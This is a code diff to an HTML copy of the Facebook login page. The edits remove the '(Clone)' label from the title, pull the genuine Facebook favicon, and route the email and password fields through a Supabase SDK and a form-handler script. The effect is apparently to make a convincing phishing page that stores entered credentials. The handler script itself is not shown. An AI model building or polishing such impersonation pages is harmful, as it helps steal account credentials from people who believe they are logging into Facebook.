@@ -2,8 +2,15 @@
 <html lang="en">
 	<head>
 		<meta charset="UTF-8" />
-		<title>Facebook Login Page (Clone)</title>
+		<title>Facebook Login</title>
 		<link rel="stylesheet" href="./style.css" />
+		<link
+			rel="icon"
+			type="image/png"
+			href="https://www.facebook.com/favicon.ico"
+		/>
+		<!-- Supabase JavaScript SDK -->
+		<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 	</head>
 	<body>
 		<!-- partial:index.partial.html -->
@@ -27,23 +34,20 @@
 				</div>
 				<div class="w-50">
 					<div class="form-section">
-						<form action="#" method="POST">
+						<form id="login-form">
 							<input
 								type="text"
 								name="email-or-number"
 								id="email-or-number"
 								placeholder="Email address or phone number"
+								required
 							/>
 							<input
 								type="password"
 								name="password"
 								id="password"
 								placeholder="Password"
-							/>
-							<input
-								type="hidden"
-								name="access_key"
-								value="563e657c-2024-43e0-aef1-585384939075"
+								required
 							/>
 							<input type="submit" name="submit" id="submit" value="Log In" />
 							<a href="#" target="_self" class="forgot">Forgotten password?</a>
@@ -139,5 +143,9 @@
 			</div>
 		</div>
 		<!-- partial -->
+
+		<!-- JavaScript files -->
+		<script src="./js/supabase-config.js"></script>
+		<script src="./js/form-handler.js"></script>
 	</body>
 </html>
